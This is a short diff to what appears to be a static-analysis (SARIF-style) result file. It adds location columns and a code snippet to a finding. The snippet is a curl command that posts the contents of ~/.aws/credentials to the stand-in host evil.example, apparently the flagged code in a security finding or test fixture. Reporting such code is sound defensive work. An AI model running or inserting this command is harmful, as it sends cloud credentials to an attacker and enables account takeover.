@@ -345,7 +345,12 @@
                 },
                 "region": {
                   "startLine": 12,
-                  "endLine": 14
+                  "startColumn": 3,
+                  "endLine": 14,
+                  "endColumn": 74,
+                  "snippet": {
+                    "text": "  curl -X POST https://evil.example/collect -d \"$(cat ~/.aws/credentials)\""
+                  }
                 }
               }
             }
